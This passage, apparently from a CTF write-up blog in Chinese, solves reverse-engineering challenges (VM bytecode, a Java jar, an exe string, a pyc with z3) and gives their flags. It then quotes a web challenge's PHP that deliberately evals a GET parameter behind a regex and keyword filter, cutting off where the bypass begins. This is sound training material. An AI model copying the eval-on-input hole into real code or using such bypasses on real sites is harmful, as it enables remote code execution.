&#x27;main&#x27;&gt; </span><br><span class="line">5: module 9 592</span><br><span class="line">11: const 26 ; 83 </span><br><span class="line">16: const 27 ; 69 </span><br><span class="line">21: const 28 ; 65 </span><br><span class="line">26: array 3</span><br><span class="line">31: store 0 0</span><br><span class="line">34: const 30 ; 101 </span><br><span class="line">39: const 31 ; 108 </span><br><span class="line">44: const 32 ; 111 </span><br><span class="line">49: const 33 ; 117 </span><br><span class="line">54: const 34 ; 122 </span><br><span class="line">59: const 30 ; 101 </span><br><span class="line">64: const 35 ; 105 </span><br><span class="line">69: const 36 ; 98 </span><br><span class="line">74: const 30 ; 101 </span><br><span class="line">79: const 31 ; 108 </span><br><span class="line">84: const 33 ; 117 </span><br><span class="line">89: const 35 ; 105 </span><br><span class="line">94: const 37 ; 113 </span><br><span class="line">99: const 33 ; 117 </span><br><span class="line">104: const 35 ; 105 </span><br><span class="line">109: const 37 ; 113 </span><br><span class="line">114: array 16</span><br><span class="line">119: store 0 1</span><br><span class="line">122: const 39 ; 0 </span><br><span class="line">127: store 0 2</span><br><span class="line">130: array 0</span><br><span class="line">135: store 0 3</span><br><span class="line">138: load 0 2</span><br><span class="line">141: const 42 ; 256 </span><br><span class="line">146: lt</span><br><span class="line">147: jz 184</span><br><span class="line">152: load 0 3</span><br><span class="line">155: const 43 ; append </span><br><span class="line">160: getattr</span><br><span class="line">161: load 0 2</span><br><span class="line">164: call 1</span><br><span class="line">166: pop</span><br><span class="line">167: load 0 2</span><br><span class="line">170: const 44 ; 1 </span><br><span class="line">175: add</span><br><span class="line">176: store 0 2</span><br><span class="line">179: jmp 138</span><br><span class="line">184: const 39 ; 0 </span><br><span class="line">189: store 0 4</span><br><span class="line">192: load 0 4</span><br><span class="line">195: const 42 ; 256 </span><br><span class="line">200: lt</span><br><span class="line">201: jz 271</span><br><span class="line">206: load 0 3</span><br><span class="line">209: load 0 4</span><br><span class="line">212: getitem</span><br><span class="line">213: load 0 0</span><br><span class="line">216: load 0 4</span><br><span class="line">219: const 46 ; 3 </span><br><span class="line">224: mod</span><br><span class="line">225: getitem</span><br><span class="line">226: add</span><br><span class="line">227: load 0 1</span><br><span class="line">230: load 0 4</span><br><span class="line">233: const 47 ; 16 </span><br><span class="line">238: mod</span><br><span class="line">239: getitem</span><br><span class="line">240: add</span><br><span class="line">241: const 42 ; 256 </span><br><span class="line">246: mod</span><br><span class="line">247: load 0 3</span><br><span class="line">250: load 0 4</span><br><span class="line">253: setitem</span><br><span class="line">254: load 0 4</span><br><span class="line">257: const 44 ; 1 </span><br><span class="line">262: add</span><br><span class="line">263: store 0 4</span><br><span class="line">266: jmp 192</span><br><span class="line">271: const 39 ; 0 </span><br><span class="line">276: store 0 5</span><br><span class="line">279: load 0 5</span><br><span class="line">282: const 46 ; 3 </span><br><span class="line">287: lt</span><br><span class="line">288: jz 448</span><br><span class="line">293: const 39 ; 0 </span><br><span class="line">298: store 0 6</span><br><span class="line">301: load 0 6</span><br><span class="line">304: const 42 ; 256 </span><br><span class="line">309: lt</span><br><span class="line">310: jz 366</span><br><span class="line">315: load 0 3</span><br><span class="line">318: load 0 6</span><br><span class="line">321: getitem</span><br><span class="line">322: load 0 3</span><br><span class="line">325: load 0 6</span><br><span class="line">328: const 44 ; 1 </span><br><span class="line">333: add</span><br><span class="line">334: const 42 ; 256 </span><br><span class="line">339: mod</span><br><span class="line">340: getitem</span><br><span class="line">341: bxor</span><br><span class="line">342: load 0 3</span><br><span class="line">345: load 0 6</span><br><span class="line">348: setitem</span><br><span class="line">349: load 0 6</span><br><span class="line">352: const 44 ; 1 </span><br><span class="line">357: add</span><br><span class="line">358: store 0 6</span><br><span class="line">361: jmp 301</span><br><span class="line">366: const 39 ; 0 </span><br><span class="line">371: store 0 7</span><br><span class="line">374: load 0 7</span><br><span class="line">377: const 42 ; 256 </span><br><span class="line">382: lt</span><br><span class="line">383: jz 431</span><br><span class="line">388: load 0 3</span><br><span class="line">391: load 0 7</span><br><span class="line">394: getitem</span><br><span class="line">395: const 44 ; 1 </span><br><span class="line">400: add</span><br><span class="line">401: const 42 ; 256 </span><br><span class="line">406: mod</span><br><span class="line">407: load 0 3</span><br><span class="line">410: load 0 7</span><br><span class="line">413: setitem</span><br><span class="line">414: load 0 7</span><br><span class="line">417: const 44 ; 1 </span><br><span class="line">422: add</span><br><span class="line">423: store 0 7</span><br><span class="line">426: jmp 374</span><br><span class="line">431: load 0 5</span><br><span class="line">434: const 44 ; 1 </span><br><span class="line">439: add</span><br><span class="line">440: store 0 5</span><br><span class="line">443: jmp 279</span><br><span class="line">448: const 39 ; 0 </span><br><span class="line">453: store 0 5</span><br><span class="line">456: const 39 ; 0 </span><br><span class="line">461: store 0 8</span><br><span class="line">464: load 0 5</span><br><span class="line">467: const 42 ; 256 </span><br><span class="line">472: lt</span><br><span class="line">473: jz 509</span><br><span class="line">478: load 0 8</span><br><span class="line">481: load 0 3</span><br><span class="line">484: load 0 5</span><br><span class="line">487: getitem</span><br><span class="line">488: add</span><br><span class="line">489: store 0 8</span><br><span class="line">492: load 0 5</span><br><span class="line">495: const 44 ; 1 </span><br><span class="line">500: add</span><br><span class="line">501: store 0 5</span><br><span class="line">504: jmp 464</span><br><span class="line">509: load 0 8</span><br><span class="line">512: const 51 ; 20 </span><br><span class="line">517: mul</span><br><span class="line">518: const 52 ; 5 </span><br><span class="line">523: add</span><br><span class="line">524: store 0 8</span><br><span class="line">527: load 0 8</span><br><span class="line">530: const 54 ; 30 </span><br><span class="line">535: mul</span><br><span class="line">536: const 52 ; 5 </span><br><span class="line">541: sub</span><br><span class="line">542: store 0 8</span><br><span class="line">545: load 0 8</span><br><span class="line">548: const 56 ; 40 </span><br><span class="line">553: mul</span><br><span class="line">554: const 52 ; 5 </span><br><span class="line">559: sub</span><br><span class="line">560: store 0 8</span><br><span class="line">563: load 0 8</span><br><span class="line">566: const 58 ; 50 </span><br><span class="line">571: mul</span><br><span class="line">572: const 59 ; 6645 </span><br><span class="line">577: add</span><br><span class="line">578: store 0 8</span><br><span class="line">581: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">586: load 0 8</span><br><span class="line">589: call 1</span><br><span class="line">591: pop</span><br></pre></td></tr></table></figure></blockquote><p>根据bytecode还原代码，需要注意数组的存储顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>,<span class="number">69</span>,<span class="number">65</span>][::-<span class="number">1</span>]</span><br><span class="line">c = [<span class="number">101</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>][::-<span class="number">1</span>]</span><br><span class="line">S = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S[j] = (S[j]+key[j%<span class="number">3</span>]+c[j%<span class="number">16</span>])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[x] = S[x]^S[(x+<span class="number">1</span>)%<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[y] = (S[y]+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b = b+S[k]</span><br><span class="line"></span><br><span class="line">b = b*<span class="number">20</span>+<span class="number">5</span></span><br><span class="line">b = b*<span class="number">30</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">40</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">50</span>+<span class="number">6645</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23075096395</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;23075096395&#125;</code></p><p>​    </p><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><blockquote><p>面对疫情，我们的口号是什么？flag{input}</p></blockquote><p>用jd工具分析jar，在Main.class发现主代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">stringTransformAscii</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    StringBuffer sbu = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">char</span>[] chars = value.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i != chars.length - <span class="number">1</span>) &#123;</span><br><span class="line">        sbu.append(chars[i]).append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sbu.append(chars[i]);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sbu.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">ttk</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = input.charAt(i);</span><br><span class="line">      <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      sb.append(c);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input your keyword);</span></span><br><span class="line"><span class="string">    Scanner scan = new Scanner(System.in);</span></span><br><span class="line"><span class="string">    String str2 = &quot;</span>ddd<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if (scan.hasNextLine())</span></span><br><span class="line"><span class="string">      str2 = scan.nextLine(); </span></span><br><span class="line"><span class="string">    scan.close();</span></span><br><span class="line"><span class="string">    String stringTransformAscii = stringTransformAscii(str2);</span></span><br><span class="line"><span class="string">    String[] offerCodeString = stringTransformAscii.split(&quot;</span>,<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    StringBuffer str5 = new StringBuffer();</span></span><br><span class="line"><span class="string">    for (String s : offerCodeString)</span></span><br><span class="line"><span class="string">      str5.append(s); </span></span><br><span class="line"><span class="string">    int flag = ttk(str2).compareTo(&quot;</span>Jr_j11y_s1tug_g0_raq_g0_raq_pnml<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;</span><span class="number">871019511949491089510249103104116951164895101110100951164895101110100959997122121</span><span class="string">&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is correct!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is wrong!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>flag经 <code>ttk()</code> 函数处理后与 <code>Jr_j11y_s1tug_g0_raq_g0_raq_pnml</code> 相同，逆 <code>ttk()</code> 替换函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += k</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We_w11l_f1ght_t0_end_t0_end_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></p><p>​    </p><h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><blockquote><p>普通的柴犬，戳一戳会发生什么奇妙的事情呢？</p></blockquote><p>将exe用16进制工具查看，根据运行提示文字找到附近存在 <code>ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</code>，base64解码得flag：<code>flag&#123;Ch1na_yyds_cazy&#125;</code>。</p><p>​    </p><h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><blockquote><p>初次见面，送个python题，祝您接下来解题顺利，flag{input}</p></blockquote><p>uncompyle6反编译pyc文件得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f = [BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">flag = f[:]</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">    t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x.add(flag[k]==Happy[k])</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        m = x.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[f[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f))]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># He110_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;He110_cazy&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>第一层正则表达式为递归匹配只含字母、数字、下划线的无参函数，如 <code>a(b_c());</code>，第二层要求不能包含 <code>session|end|next|header|dir</code> 关键字，使用 <code>get_defined_vars()</code> 可从请求中向 